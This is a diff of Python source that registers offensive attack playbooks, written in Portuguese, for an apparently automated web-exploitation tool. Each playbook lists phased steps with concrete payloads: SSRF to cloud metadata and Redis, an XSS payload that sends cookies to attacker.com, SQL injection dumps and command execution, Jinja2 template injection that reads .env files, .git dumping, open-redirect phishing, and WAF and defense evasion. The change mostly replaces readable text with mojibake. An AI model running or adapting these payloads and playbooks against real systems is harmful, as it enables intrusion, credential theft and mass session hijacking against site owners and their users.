-         "confirm": "Response contém AccessKeyId + SecretAccessKey → AWS credentials expostas",
-         "fallback": "Se IMDSv2 → tentar GCP metadata ou Azure Instance Metadata"},
-        {"phase": "exploitation", "thought": "Com SSRF ativo → pivotar para Redis para dump de sessões",
-         "action": "SSRF → http://127.0.0.1:6379/INFO + SSRF → redis://127.0.0.1:6379/KEYS *",
-         "confirm": "Redis INFO retorna versão + KEYS mostra chaves de sessão (session:*, user:*)",
-         "fallback": "Se Redis não acessível → tentar PostgreSQL, MongoDB, Elasticsearch",
-         "escalation": "Sessões Redis expostas → hijack de sessões admin → acesso total"},
-        {"phase": "data_capture", "thought": "Dados de sessão contêm tokens/CPFs — extrair e catalogar",
-         "action": "SSRF → redis://127.0.0.1:6379/GET session:{admin_session_id}",
-         "confirm": "Dados de sessão contêm user_id, email, role=admin, token JWT",
-         "escalation": "Session hijack → pivotar para /admin com cookie roubado"},
-        {"phase": "lateral_movement", "thought": "SSRF como túnel — ignorar Cloudflare acessando backend direto",
-         "action": "SSRF → http://localhost/phpmyadmin, /adminer, /pgadmin",
-         "confirm": "Painel de DB acessível via túnel SSRF — bypassing WAF completamente",
-         "escalation": "Acesso direto ao DB → dump completo de tabelas sensíveis"},
+        {"phase": "infiltration", "thought": "SSRF permite acesso Ã  rede interna  priorizar cloud metadata sobre tudo",
+         "action": "SSRF â†’ http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+         "confirm": "Response contÃ©m AccessKeyId + SecretAccessKey â†’ AWS credentials expostas",
+         "fallback": "Se IMDSv2 â†’ tentar GCP metadata ou Azure Instance Metadata"},
+        {"phase": "exploitation", "thought": "Com SSRF ativo â†’ pivotar para Redis para dump de sessÃµes",
+         "action": "SSRF â†’ http://127.0.0.1:6379/INFO + SSRF â†’ redis://127.0.0.1:6379/KEYS *",
+         "confirm": "Redis INFO retorna versÃ£o + KEYS mostra chaves de sessÃ£o (session:*, user:*)",
+         "fallback": "Se Redis nÃ£o acessÃ­vel â†’ tentar PostgreSQL, MongoDB, Elasticsearch",
+         "escalation": "SessÃµes Redis expostas â†’ hijack de sessÃµes admin â†’ acesso total"},
+        {"phase": "data_capture", "thought": "Dados de sessÃ£o contÃªm tokens/CPFs  extrair e catalogar",
+         "action": "SSRF â†’ redis://127.0.0.1:6379/GET session:{admin_session_id}",
+         "confirm": "Dados de sessÃ£o contÃªm user_id, email, role=admin, token JWT",
+         "escalation": "Session hijack â†’ pivotar para /admin com cookie roubado"},
+        {"phase": "lateral_movement", "thought": "SSRF como tÃºnel  ignorar Cloudflare acessando backend direto",
+         "action": "SSRF â†’ http://localhost/phpmyadmin, /adminer, /pgadmin",
+         "confirm": "Painel de DB acessÃ­vel via tÃºnel SSRF  bypassing WAF completamente",
+         "escalation": "Acesso direto ao DB â†’ dump completo de tabelas sensÃ­veis"},
     ],
-    "SSRF é mais silencioso que brute force — Cloudflare não vê requests internos. Priorizar SSRF sobre força bruta",
+    "SSRF Ã© mais silencioso que brute force  Cloudflare nÃ£o vÃª requests internos. Priorizar SSRF sobre forÃ§a bruta",
     ["AccessKeyId", "SecretAccessKey", "session_token", "redis_keys", "db_credentials"],
     ["http://169.254.169.254/", "http://127.0.0.1:6379/", "http://localhost:5432/",
      "http://127.0.0.1:9200/", "http://127.0.0.1:8500/"],
@@ -738,18 +738,18 @@ _register(
 
 _register(
     "xss_eval_innerhtml", "client_side", ThreatLevel.HIGH,
-    "eval()/innerHTML no JS → captura de tráfego → session hijack → account takeover",
+    "eval()/innerHTML no JS â†’ captura de trÃ¡fego â†’ session hijack â†’ account takeover",
     [
-        {"phase": "exploitation", "thought": "eval() ou innerHTML com input do user → XSS confirmável",
+        {"phase": "exploitation", "thought": "eval() ou innerHTML com input do user â†’ XSS confirmÃ¡vel",
          "action": "Injetar payload: <img src=x onerror=fetch('https://attacker.com/'+document.cookie)>",
          "confirm": "Cookie exfiltrado para attacker server OU alert() executado",
-         "fallback": "Se CSP bloqueia → tentar bypass via JSONP callback ou trusted types"},
-        {"phase": "data_capture", "thought": "XSS persistente = captura contínua de cookies de todos os users",
+         "fallback": "Se CSP bloqueia â†’ tentar bypass via JSONP callback ou trusted types"},
+        {"phase": "data_capture", "thought": "XSS persistente = captura contÃ­nua de cookies de todos os users",
          "action": "Injetar payload persistente em campo que renderiza para outros users (comment, profile)",
-         "confirm": "Payload renderiza para outros usuários → stored XSS confirmado",
-         "escalation": "Stored XSS + no HttpOnly → session hijack em massa"},
+         "confirm": "Payload renderiza para outros usuÃ¡rios â†’ stored XSS confirmado",
+         "escalation": "Stored XSS + no HttpOnly â†’ session hijack em massa"},
     ],
-    "CSP bypass: usar nonce/hash collision, JSONP endpoints do próprio domínio, ou data: URIs",
+    "CSP bypass: usar nonce/hash collision, JSONP endpoints do prÃ³prio domÃ­nio, ou data: URIs",
     ["document.cookie", "session_token", "localStorage", "JWT"],
     ["/api/profile", "/comments", "/admin"],
     ["xss_payload_executed", "cookie_exfiltrated", "stored_xss_confirmed"]
@@ -757,18 +757,18 @@ _register(
 
 _register(
     "cookies_insecure", "session", ThreatLevel.HIGH,
-    "Cookies sem HttpOnly/Secure → sequestro de conta via XSS ou network sniffing",
+    "Cookies sem HttpOnly/Secure â†’ sequestro de conta via XSS ou network sniffing",
     [
-        {"phase": "exploitation", "thought": "Cookie sem HttpOnly → acessível via document.cookie → XSS = game over",
+        {"phase": "exploitation", "thought": "Cookie sem HttpOnly â†’ acessÃ­vel via document.cookie â†’ XSS = game over",
          "action": "Verificar Set-Cookie headers: HttpOnly, Secure, SameSite flags",
-         "confirm": "Cookie de sessão sem HttpOnly flag → vulnerável a XSS cookie theft",
-         "fallback": "Se HttpOnly presente mas sem Secure → MITM em HTTP → cookie intercept"},
-        {"phase": "privilege_escalation", "thought": "Cookie capturado → replay em browser do atacante",
-         "action": "Copiar cookie de sessão → setar no browser → acessar /admin ou /account",
-         "confirm": "Sessão ativa como outro user após replay de cookie",
-         "escalation": "Session hijack → verificar se user é admin → acesso total"},
+         "confirm": "Cookie de sessÃ£o sem HttpOnly flag â†’ vulnerÃ¡vel a XSS cookie theft",
+         "fallback": "Se HttpOnly presente mas sem Secure â†’ MITM em HTTP â†’ cookie intercept"},
+        {"phase": "privilege_escalation", "thought": "Cookie capturado â†’ replay em browser do atacante",
+         "action": "Copiar cookie de sessÃ£o â†’ setar no browser â†’ acessar /admin ou /account",
+         "confirm": "SessÃ£o ativa como outro user apÃ³s replay de cookie",
+         "escalation": "Session hijack â†’ verificar se user Ã© admin â†’ acesso total"},
     ],
-    "Cookie theft via XSS é silencioso — WAF não detecta exfiltração via img src ou fetch",
+    "Cookie theft via XSS Ã© silencioso  WAF nÃ£o detecta exfiltraÃ§Ã£o via img src ou fetch",
     ["session_id", "auth_token", "user_role"],
     ["/admin", "/account", "/api/me"],
     ["session_cookie_accessible_via_js", "session_hijack_confirmed"]
@@ -776,22 +776,22 @@ _register(
 
 _register(
     "sensitive_subdomain", "reconnaissance", ThreatLevel.HIGH,
-    "Subdomínio sensível (dev/staging/admin) → ambiente com menos proteção → backup files + debug mode",
+    "SubdomÃ­nio sensÃ­vel (dev/staging/admin) â†’ ambiente com menos proteÃ§Ã£o â†’ backup files + debug mode",
     [
-        {"phase": "recon", "thought": "dev/staging geralmente têm debug=true e menos WAF → mais fácil de explorar",
-         "action": "Acessar dev.target.com, staging.target.com — verificar se retorna 200",
-         "confirm": "Subdomínio acessível → verificar headers (X-Debug, X-Powered-By, Server version)",
-         "fallback": "Se DNS não resolve → tentar vhost brute force via Host header"},
-        {"phase": "infiltration", "thought": "Subdomínio dev pode ter backups expostos → zero-click data capture",
+        {"phase": "recon", "thought": "dev/staging geralmente tÃªm debug=true e menos WAF â†’ mais fÃ¡cil de explorar",
+         "action": "Acessar dev.target.com, staging.target.com  verificar se retorna 200",
+         "confirm": "SubdomÃ­nio acessÃ­vel â†’ verificar headers (X-Debug, X-Powered-By, Server version)",
+         "fallback": "Se DNS nÃ£o resolve â†’ tentar vhost brute force via Host header"},
+        {"phase": "infiltration", "thought": "SubdomÃ­nio dev pode ter backups expostos â†’ zero-click data capture",
          "action": "GET /db.sql, /backup.zip, /.git/config, /.env, /debug.log, /phpinfo.php",
-         "confirm": "Arquivo de backup ou .env acessível → credenciais expostas",
-         "escalation": "Credenciais do .env → usar para login no ambiente de produção"},
-        {"phase": "data_capture", "thought": ".git exposto → clonar repositório completo → buscar secrets no history",
-         "action": "GET /.git/HEAD, /.git/config, /.git/refs/heads/main — reconstruct repo",
-         "confirm": ".git/config retorna repositório info → possível clone completo",
+         "confirm": "Arquivo de backup ou .env acessÃ­vel â†’ credenciais expostas",
+         "escalation": "Credenciais do .env â†’ usar para login no ambiente de produÃ§Ã£o"},
+        {"phase": "data_capture", "thought": ".git exposto â†’ clonar repositÃ³rio completo â†’ buscar secrets no history",
+         "action": "GET /.git/HEAD, /.git/config, /.git/refs/heads/main  reconstruct repo",
+         "confirm": ".git/config retorna repositÃ³rio info â†’ possÃ­vel clone completo",
          "escalation": "Git history pode conter API keys, DB passwords, JWT secrets removidos"},
     ],
-    "Subdomínios dev/staging raramente têm WAF configurado — requests diretos funcionam",
+    "SubdomÃ­nios dev/staging raramente tÃªm WAF configurado  requests diretos funcionam",
     ["DB_PASSWORD", "API_KEY", "JWT_SECRET", "AWS_KEY", ".env_contents"],
     ["/.env", "/.git/config", "/db.sql", "/backup.zip", "/debug.log", "/phpinfo.php"],
     ["backup_file_accessible", "env_file_exposed", "git_repo_clonable", "debug_mode_active"]
@@ -799,18 +799,18 @@ _register(
 
 _register(
     "js_secrets_exposed", "client_side", ThreatLevel.HIGH,
-    "Secrets no JS → usar chaves capturadas para acessar APIs que não pedem token próprio",
+    "Secrets no JS â†’ usar chaves capturadas para acessar APIs que nÃ£o pedem token prÃ³prio",
     [
-        {"phase": "exploitation", "thought": "API keys no JS bundle → tentar acessar endpoints protegidos",
-         "action": "Extrair API keys do JS → testar em /api/v1/* endpoints com Authorization header",
-         "confirm": "API responde com dados ao usar key extraída do JS",
-         "fallback": "Se key é read-only → verificar se permite write (POST/PUT/DELETE)"},
-        {"phase": "privilege_escalation", "thought": "Key pode ter mais permissões do que o frontend usa",
+        {"phase": "exploitation", "thought": "API keys no JS bundle â†’ tentar acessar endpoints protegidos",
+         "action": "Extrair API keys do JS â†’ testar em /api/v1/* endpoints com Authorization header",
+         "confirm": "API responde com dados ao usar key extraÃ­da do JS",
+         "fallback": "Se key Ã© read-only â†’ verificar se permite write (POST/PUT/DELETE)"},
+        {"phase": "privilege_escalation", "thought": "Key pode ter mais permissÃµes do que o frontend usa",
          "action": "Testar: GET /api/admin/users, POST /api/admin/config com key capturada",
-         "confirm": "Admin endpoints acessíveis com key pública do JS → broken access control",
-         "escalation": "API key com acesso admin → dump de dados completo"},
+         "confirm": "Admin endpoints acessÃ­veis com key pÃºblica do JS â†’ broken access control",
+         "escalation": "API key com acesso admin â†’ dump de dados completo"},
     ],
-    "Keys no JS são públicas — não há WAF bypass necessário, só enumerar endpoints",
+    "Keys no JS sÃ£o pÃºblicas  nÃ£o hÃ¡ WAF bypass necessÃ¡rio, sÃ³ enumerar endpoints",
     ["API_KEY", "stripe_key", "firebase_config", "google_maps_key"],
     ["/api/v1/users", "/api/admin", "/api/config", "/graphql"],
     ["api_key_grants_elevated_access", "admin_endpoint_accessible_via_js_key"]
@@ -818,18 +818,18 @@ _register(
 
 _register(
     "source_map_exposed", "client_side", ThreatLevel.MEDIUM,
-    "Source map exposto → reconstruir código fonte original → encontrar endpoints internos e lógica de auth",
+    "Source map exposto â†’ reconstruir cÃ³digo fonte original â†’ encontrar endpoints internos e lÃ³gica de auth",
     [
-        {"phase": "recon", "thought": "Source map (.map) permite reconstrução completa do código fonte",
-         "action": "GET /static/js/main.js.map — baixar e decodificar",
-         "confirm": "Source map retorna código original com comentários, imports, lógica de auth",
-         "fallback": "Se .map removido → tentar webpack chunks: 0.chunk.js.map, vendor.js.map"},
-        {"phase": "exploitation", "thought": "Código fonte revela rotas internas, API secrets, lógica de validação",
+        {"phase": "recon", "thought": "Source map (.map) permite reconstruÃ§Ã£o completa do cÃ³digo fonte",
+         "action": "GET /static/js/main.js.map  baixar e decodificar",
+         "confirm": "Source map retorna cÃ³digo original com comentÃ¡rios, imports, lÃ³gica de auth",
+         "fallback": "Se .map removido â†’ tentar webpack chunks: 0.chunk.js.map, vendor.js.map"},
+        {"phase": "exploitation", "thought": "CÃ³digo fonte revela rotas internas, API secrets, lÃ³gica de validaÃ§Ã£o",
          "action": "Grep source map para: /api/admin, password, secret, token, key, internal",
-         "confirm": "Rotas internas ou lógica de auth encontrada no source code",
-         "escalation": "Endpoints internos descobertos → testar cada um para broken access control"},
+         "confirm": "Rotas internas ou lÃ³gica de auth encontrada no source code",
+         "escalation": "Endpoints internos descobertos â†’ testar cada um para broken access control"},
     ],
-    "Source maps são servidos como arquivos estáticos — WAF geralmente não filtra",
+    "Source maps sÃ£o servidos como arquivos estÃ¡ticos  WAF geralmente nÃ£o filtra",
     ["internal_routes", "auth_logic", "api_endpoints", "validation_rules"],
     ["/api/admin", "/api/internal", "/api/debug"],
     ["source_map_decoded", "internal_routes_discovered", "auth_logic_revealed"]
@@ -837,22 +837,22 @@ _register(
 
 _register(
     "/api/proxy", "infrastructure", ThreatLevel.CRITICAL,
-    "Proxy endpoint → SSRF nativo → redirecionar para cloud metadata e serviços internos",
+    "Proxy endpoint â†’ SSRF nativo â†’ redirecionar para cloud metadata e serviÃ§os internos",
     [
-        {"phase": "infiltration", "thought": "Proxy endpoint aceita URL → SSRF direto sem encoding necessário",
+        {"phase": "infiltration", "thought": "Proxy endpoint aceita URL â†’ SSRF direto sem encoding necessÃ¡rio",
          "action": "GET /api/proxy?url=http://169.254.169.254/latest/meta-data/",
-         "confirm": "Response contém metadata AWS → SSRF confirmado via proxy",
-         "fallback": "Se URL validado → tentar DNS rebinding ou IPv6 bypass (http://[::1]:6379/)"},
-        {"phase": "exploitation", "thought": "SSRF via proxy → acessar Redis sem firewall, dump sessions",
+         "confirm": "Response contÃ©m metadata AWS â†’ SSRF confirmado via proxy",
+         "fallback": "Se URL validado â†’ tentar DNS rebinding ou IPv6 bypass (http://[::1]:6379/)"},
+        {"phase": "exploitation", "thought": "SSRF via proxy â†’ acessar Redis sem firewall, dump sessions",
          "action": "GET /api/proxy?url=http://127.0.0.1:6379/INFO",
-         "confirm": "Redis INFO retorna → serviço interno acessível via proxy",
-         "escalation": "Redis acessível → KEYS * → session data → hijack admin"},
-        {"phase": "lateral_movement", "thought": "Proxy como túnel → scan de portas internas via SSRF",
+         "confirm": "Redis INFO retorna â†’ serviÃ§o interno acessÃ­vel via proxy",
+         "escalation": "Redis acessÃ­vel â†’ KEYS * â†’ session data â†’ hijack admin"},
+        {"phase": "lateral_movement", "thought": "Proxy como tÃºnel â†’ scan de portas internas via SSRF",
          "action": "Iterar ports 80,443,3306,5432,6379,8080,9200,27017 via proxy",
-         "confirm": "Múltiplos serviços internos respondendo → mapa da infraestrutura interna",
-         "escalation": "Mapa de infra → priorizar DB e cache para data extraction"},
+         "confirm": "MÃºltiplos serviÃ§os internos respondendo â†’ mapa da infraestrutura interna",
+         "escalation": "Mapa de infra â†’ priorizar DB e cache para data extraction"},
     ],
-    "Proxy é caminho mais silencioso — requests passam pelo próprio server, Cloudflare não vê",
+    "Proxy Ã© caminho mais silencioso  requests passam pelo prÃ³prio server, Cloudflare nÃ£o vÃª",
     ["cloud_metadata", "redis_data", "internal_services", "db_credentials"],
     ["http://169.254.169.254/", "http://127.0.0.1:6379/", "http://127.0.0.1:5432/",
      "http://127.0.0.1:9200/", "http://127.0.0.1:27017/"],
@@ -861,18 +861,18 @@ _register(
 
 _register(
     "/.env", "data_exposure", ThreatLevel.CRITICAL,
-    ".env exposto → todas as credenciais do backend em texto plano → game over total",
+    ".env exposto â†’ todas as credenciais do backend em texto plano â†’ game over total",
     [
-        {"phase": "data_capture", "thought": ".env contém DB_PASSWORD, API_KEYS, JWT_SECRET — acesso imediato",
-         "action": "GET /.env — baixar e parsear todas as variáveis",
+        {"phase": "data_capture", "thought": ".env contÃ©m DB_PASSWORD, API_KEYS, JWT_SECRET  acesso imediato",
+         "action": "GET /.env  baixar e parsear todas as variÃ¡veis",
          "confirm": "Arquivo retorna com DATABASE_URL, SECRET_KEY, API tokens",
-         "fallback": "Se bloqueado → tentar /.env.bak, /.env.production, /env.example"},
-        {"phase": "privilege_escalation", "thought": "Credenciais do .env → acesso direto ao banco de dados",
+         "fallback": "Se bloqueado â†’ tentar /.env.bak, /.env.production, /env.example"},
+        {"phase": "privilege_escalation", "thought": "Credenciais do .env â†’ acesso direto ao banco de dados",
          "action": "Conectar no DATABASE_URL com credenciais capturadas",
-         "confirm": "Conexão ao DB estabelecida → dump de tabelas users, orders, payments",
-         "escalation": "Acesso direto ao DB = controle total da aplicação"},
+         "confirm": "ConexÃ£o ao DB estabelecida â†’ dump de tabelas users, orders, payments",
+         "escalation": "Acesso direto ao DB = controle total da aplicaÃ§Ã£o"},
     ],
-    "Arquivos estáticos raramente são filtrados por WAF — request direto funciona",
+    "Arquivos estÃ¡ticos raramente sÃ£o filtrados por WAF  request direto funciona",
     ["DATABASE_URL", "SECRET_KEY", "API_KEY", "JWT_SECRET", "REDIS_URL", "STRIPE_KEY"],
     ["/admin", "/api/config", "/.git/config"],
     ["env_file_captured", "db_credentials_exposed", "direct_db_access_confirmed"]
@@ -880,18 +880,18 @@ _register(
 
 _register(
     "/.git/config", "data_exposure", ThreatLevel.HIGH,
-    ".git exposto → reconstruir repositório completo → extrair secrets do histórico de commits",
+    ".git exposto â†’ reconstruir repositÃ³rio completo â†’ extrair secrets do histÃ³rico de commits",
     [
-        {"phase": "data_capture", "thought": ".git/config acessível = possível clonar todo o repositório",
-         "action": "GET /.git/HEAD, /.git/refs/heads/main, /.git/objects/ — reconstruct tree",
-         "confirm": ".git/HEAD retorna ref: refs/heads/main → repositório exposto",
-         "fallback": "Se directory listing off → usar git-dumper tool com known paths"},
-        {"phase": "exploitation", "thought": "Git history contém secrets que foram 'removidos' em commits posteriores",
+        {"phase": "data_capture", "thought": ".git/config acessÃ­vel = possÃ­vel clonar todo o repositÃ³rio",
+         "action": "GET /.git/HEAD, /.git/refs/heads/main, /.git/objects/  reconstruct tree",
+         "confirm": ".git/HEAD retorna ref: refs/heads/main â†’ repositÃ³rio exposto",
+         "fallback": "Se directory listing off â†’ usar git-dumper tool com known paths"},
+        {"phase": "exploitation", "thought": "Git history contÃ©m secrets que foram 'removidos' em commits posteriores",
          "action": "git log --all -p | grep -i 'password\\|secret\\|key\\|token'",
-         "confirm": "Credentials encontradas em commits antigos → secrets nunca são realmente deletados do git",
-         "escalation": "Secrets históricos podem ainda estar ativos → testar cada um"},
+         "confirm": "Credentials encontradas em commits antigos â†’ secrets nunca sÃ£o realmente deletados do git",
+         "escalation": "Secrets histÃ³ricos podem ainda estar ativos â†’ testar cada um"},
     ],
-    "Git objects são servidos como static files — WAF não filtra binários .git",
+    "Git objects sÃ£o servidos como static files  WAF nÃ£o filtra binÃ¡rios .git",
     ["git_history", "old_passwords", "removed_api_keys", "database_urls"],
     ["/.env", "/admin", "/api/config"],
     ["git_repo_reconstructed", "historical_secrets_found"]
@@ -899,16 +899,16 @@ _register(
 
 _register(
     "verb_tampering", "exploitation", ThreatLevel.HIGH,
-    "Endpoint protege GET/POST mas esquece PUT/DELETE → write access via verb tampering",
+    "Endpoint protege GET/POST mas esquece PUT/DELETE â†’ write access via verb tampering",
     [
         {"phase": "exploitation", "thought": "REST APIs protegem verbs comuns mas esquecem PUT/PATCH/DELETE",
-         "action": "PUT /api/users/1 com {\"role\":\"admin\"} — tentar privilege escalation via verb",
-         "confirm": "PUT aceito + role alterado para admin → broken access control via verb",
-         "fallback": "Se PUT bloqueado → tentar PATCH, ou X-HTTP-Method-Override: PUT no header"},
-        {"phase": "privilege_escalation", "thought": "Write access confirmado → modificar próprio role para admin",
+         "action": "PUT /api/users/1 com {\"role\":\"admin\"}  tentar privilege escalation via verb",
+         "confirm": "PUT aceito + role alterado para admin â†’ broken access control via verb",
+         "fallback": "Se PUT bloqueado â†’ tentar PATCH, ou X-HTTP-Method-Override: PUT no header"},
+        {"phase": "privilege_escalation", "thought": "Write access confirmado â†’ modificar prÃ³prio role para admin",
          "action": "PATCH /api/users/{my_id} com {\"role\":\"admin\",\"is_admin\":true}",
-         "confirm": "GET /api/me retorna role=admin → privilege escalation confirmada",
-         "escalation": "Admin role → acesso a /admin → dump de dados completo"},
+         "confirm": "GET /api/me retorna role=admin â†’ privilege escalation confirmada",
+         "escalation": "Admin role â†’ acesso a /admin â†’ dump de dados completo"},
     ],
     "Usar X-HTTP-Method-Override ou _method=PUT em body para bypass de method filtering",
     ["user_role", "is_admin", "permissions"],
@@ -918,22 +918,22 @@ _register(
 
 _register(
     "sqli_confirmed", "exploitation", ThreatLevel.CRITICAL,
-    "SQLi confirmado → extrair tabelas → dump de users com senhas → prova de acesso total",
+    "SQLi confirmado â†’ extrair tabelas â†’ dump de users com senhas â†’ prova de acesso total",
     [
-        {"phase": "exploitation", "thought": "SQLi = acesso direto ao DB — priorizar UNION-based para dump rápido",
+        {"phase": "exploitation", "thought": "SQLi = acesso direto ao DB  priorizar UNION-based para dump rÃ¡pido",
          "action": "UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'",
-         "confirm": "Lista de tabelas retornada → estrutura do DB exposta",
-         "fallback": "Se UNION bloqueado → usar boolean blind ou time-based (pg_sleep/BENCHMARK)"},
-        {"phase": "data_capture", "thought": "Tabelas conhecidas → dump de users, orders, payments",
+         "confirm": "Lista de tabelas retornada â†’ estrutura do DB exposta",
+         "fallback": "Se UNION bloqueado â†’ usar boolean blind ou time-based (pg_sleep/BENCHMARK)"},
+        {"phase": "data_capture", "thought": "Tabelas conhecidas â†’ dump de users, orders, payments",
          "action": "UNION SELECT email,password FROM users LIMIT 100",
-         "confirm": "Emails + password hashes retornados → comprometimento total do DB",
-         "escalation": "Hashes MD5/SHA1 sem salt → crackear com hashcat em minutos"},
-        {"phase": "lateral_movement", "thought": "PostgreSQL → tentar RCE via COPY TO/pg_read_file",
+         "confirm": "Emails + password hashes retornados â†’ comprometimento total do DB",
+         "escalation": "Hashes MD5/SHA1 sem salt â†’ crackear com hashcat em minutos"},
+        {"phase": "lateral_movement", "thought": "PostgreSQL â†’ tentar RCE via COPY TO/pg_read_file",
          "action": "'; COPY (SELECT '') TO PROGRAM 'id'; --",
-         "confirm": "Output de comando de sistema → RCE via SQLi",
-         "escalation": "RCE = controle total do servidor → lateral movement para outros hosts"},
+         "confirm": "Output de comando de sistema â†’ RCE via SQLi",
+         "escalation": "RCE = controle total do servidor â†’ lateral movement para outros hosts"},
     ],
-    "WAF bypass: usar CASE WHEN, comentários inline (/**/), encoding alternativo (CHAR())",
+    "WAF bypass: usar CASE WHEN, comentÃ¡rios inline (/**/), encoding alternativo (CHAR())",
     ["email", "password_hash", "CPF", "credit_card", "session_tokens"],
     ["/api/users", "/api/orders", "/api/payments", "/admin"],
     ["db_structure_dumped", "user_credentials_extracted", "rce_via_sqli"]
@@ -941,18 +941,18 @@ _register(
 
 _register(
     "ssti_confirmed", "exploitation", ThreatLevel.CRITICAL,
-    "SSTI confirmado → RCE no servidor → acesso total ao filesystem e rede interna",
+    "SSTI confirmado â†’ RCE no servidor â†’ acesso total ao filesystem e rede interna",
     [
-        {"phase": "exploitation", "thought": "SSTI = code execution no template engine → escalar para RCE",
+        {"phase": "exploitation", "thought": "SSTI = code execution no template engine â†’ escalar para RCE",
          "action": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
-         "confirm": "Output de 'id' command → RCE confirmado via SSTI",
-         "fallback": "Se Jinja2 bloqueado → tentar Twig {{_self.env.getFilter('exec')}} ou ERB"},
-        {"phase": "data_capture", "thought": "RCE → ler .env, /etc/passwd, e DB credentials direto do filesystem",
+         "confirm": "Output de 'id' command â†’ RCE confirmado via SSTI",
+         "fallback": "Se Jinja2 bloqueado â†’ tentar Twig {{_self.env.getFilter('exec')}} ou ERB"},
+        {"phase": "data_capture", "thought": "RCE â†’ ler .env, /etc/passwd, e DB credentials direto do filesystem",
          "action": "{{config.__class__.__init__.__globals__['os'].popen('cat /app/.env').read()}}",
-         "confirm": "Conteúdo do .env retornado → todas as credenciais capturadas",
-         "escalation": "RCE + credenciais → acesso irrestrito à infraestrutura"},
+         "confirm": "ConteÃºdo do .env retornado â†’ todas as credenciais capturadas",
+         "escalation": "RCE + credenciais â†’ acesso irrestrito Ã  infraestrutura"},
     ],
-    "SSTI payloads são strings curtas — WAF pode ser bypassado com encoding ou concatenação",
+    "SSTI payloads sÃ£o strings curtas  WAF pode ser bypassado com encoding ou concatenaÃ§Ã£o",
     ["server_filesystem", "env_variables", "db_credentials", "private_keys"],
     ["/.env", "/etc/passwd", "/proc/self/environ"],
     ["rce_via_ssti_confirmed", "filesystem_access", "env_variables_captured"]
@@ -960,16 +960,16 @@ _register(
 
 _register(
     "open_redirect", "client_side", ThreatLevel.MEDIUM,
-    "Open redirect → phishing avançado → redirecionar user para clone do login → capturar credenciais",
+    "Open redirect â†’ phishing avanÃ§ado â†’ redirecionar user para clone do login â†’ capturar credenciais",
     [
-        {"phase": "exploitation", "thought": "Open redirect no domínio legítimo → phishing mais convincente",
-         "action": "GET /redirect?url=https://evil-clone.com/login — verificar se redireciona",
-         "confirm": "302 redirect para domínio externo → open redirect confirmado",
-         "fallback": "Se URL validado → tentar bypass: //evil.com, /\\evil.com, /%0d%0aLocation:evil.com"},
-        {"phase": "data_capture", "thought": "Usar redirect para phishing → capturar credenciais em página clone",
+        {"phase": "exploitation", "thought": "Open redirect no domÃ­nio legÃ­timo â†’ phishing mais convincente",
+         "action": "GET /redirect?url=https://evil-clone.com/login  verificar se redireciona",
+         "confirm": "302 redirect para domÃ­nio externo â†’ open redirect confirmado",
+         "fallback": "Se URL validado â†’ tentar bypass: //evil.com, /\\evil.com, /%0d%0aLocation:evil.com"},
+        {"phase": "data_capture", "thought": "Usar redirect para phishing â†’ capturar credenciais em pÃ¡gina clone",
          "action": "Criar URL: https://legit-site.com/redirect?url=https://evil-login.com",
-         "confirm": "URL funcional que redireciona para página maliciosa",
-         "escalation": "Combinar com email phishing → mass credential theft"},
+         "confirm": "URL funcional que redireciona para pÃ¡gina maliciosa",
+         "escalation": "Combinar com email phishing â†’ mass credential theft"},
     ],
     "URL validation bypass: protocol-relative (//), backslash (/\\), unicode chars",
     ["redirect_url", "referer_token"],
@@ -979,18 +979,18 @@ _register(
 
 _register(
     "data_drift_detected", "defense_evasion", ThreatLevel.MEDIUM,
-    "Backend mudou mid-scan (200→403) → sistema recalibrando → tentar rotas alternativas imediatamente",
+    "Backend mudou mid-scan (200â†’403) â†’ sistema recalibrando â†’ tentar rotas alternativas imediatamente",
     [
-        {"phase": "recon", "thought": "Status mudou = defense ativada → mudar de vetor imediatamente",
-         "action": "Detectar mudança 200→403/404 → pivotar para subdomínios: dev, staging, api, beta",
-         "confirm": "Subdomínio alternativo responde 200 → rota alternativa encontrada",
-         "fallback": "Se todos subdomínios bloqueados → reduzir frequência e usar encodings"},
-        {"phase": "exploitation", "thought": "AmazonS3→outro server = recalibrar metadata dump attempts",
-         "action": "Re-fingerprint infra → ajustar SSRF targets para novo provider",
-         "confirm": "Novo provider identificado → SSRF targets recalibrados",
-         "escalation": "Infra recalibrada → retomar exploitation com novos vetores"},
+        {"phase": "recon", "thought": "Status mudou = defense ativada â†’ mudar de vetor imediatamente",
+         "action": "Detectar mudanÃ§a 200â†’403/404 â†’ pivotar para subdomÃ­nios: dev, staging, api, beta",
+         "confirm": "SubdomÃ­nio alternativo responde 200 â†’ rota alternativa encontrada",
+         "fallback": "Se todos subdomÃ­nios bloqueados â†’ reduzir frequÃªncia e usar encodings"},
+        {"phase": "exploitation", "thought": "AmazonS3â†’outro server = recalibrar metadata dump attempts",
+         "action": "Re-fingerprint infra â†’ ajustar SSRF targets para novo provider",
+         "confirm": "Novo provider identificado â†’ SSRF targets recalibrados",
+         "escalation": "Infra recalibrada â†’ retomar exploitation com novos vetores"},
     ],
-    "Data drift = WAF aprendendo — reduzir request rate e variar User-Agent/IP",
+    "Data drift = WAF aprendendo  reduzir request rate e variar User-Agent/IP",
     ["new_status_code", "new_provider", "alternative_routes"],
     ["/api/proxy", "/api/search", "/api/config"],
     ["drift_detected_and_recalibrated", "alternative_route_found"]
@@ -998,18 +998,18 @@ _register(
 
 _register(
     "graphql_exposed", "api_exposure", ThreatLevel.HIGH,
-    "GraphQL exposto → introspection query → mapa completo do schema → query sensíveis",
+    "GraphQL exposto â†’ introspection query â†’ mapa completo do schema â†’ query sensÃ­veis",
     [
         {"phase": "recon", "thought": "GraphQL com introspection = mapa completo de todos os types e queries",
          "action": "POST /graphql com {\"query\":\"{__schema{types{name fields{name type{name}}}}}\"}",
-         "confirm": "Schema completo retornado → todos os endpoints internos mapeados",
-         "fallback": "Se introspection desabilitado → brute force field names com wordlist"},
-        {"phase": "exploitation", "thought": "Schema revela queries admin, mutations sensíveis",
+         "confirm": "Schema completo retornado â†’ todos os endpoints internos mapeados",
+         "fallback": "Se introspection desabilitado â†’ brute force field names com wordlist"},
+        {"phase": "exploitation", "thought": "Schema revela queries admin, mutations sensÃ­veis",
          "action": "Executar queries admin descobertas: {users{email password} orders{total card}}",
-         "confirm": "Dados sensíveis retornados via GraphQL queries → broken access control",
-         "escalation": "Mutations admin → alterar roles, deletar dados, exfiltrar em batch"},
+         "confirm": "Dados sensÃ­veis retornados via GraphQL queries â†’ broken access control",
